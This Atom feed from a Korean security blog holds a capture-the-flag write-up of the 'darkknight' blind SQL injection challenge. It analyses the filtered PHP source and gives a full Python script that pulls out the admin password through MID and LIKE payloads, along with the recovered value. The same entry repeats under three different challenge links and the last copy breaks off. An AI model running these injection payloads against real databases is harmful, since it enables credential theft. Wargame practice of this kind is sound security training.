<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>jslee&#39;s blog</title>
  
  <subtitle>Develop, InfoSec &amp; Life</subtitle>
  <link href="/feed.xml" rel="self"/>
  
  <link href="https://www.jslee.me/"/>
  <updated>2019-09-09T05:38:15.608Z</updated>
  <id>https://www.jslee.me/</id>
  
  <author>
    <name>Jaeseok Lee</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-22-dark-eyes/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-22-dark-eyes/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-09-09T05:38:15.608Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-17-succubus/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-17-succubus/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-09-09T05:38:15.607Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-21-iron-golem/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-21-iron-golem/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-09-09T05:38:15.608Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span 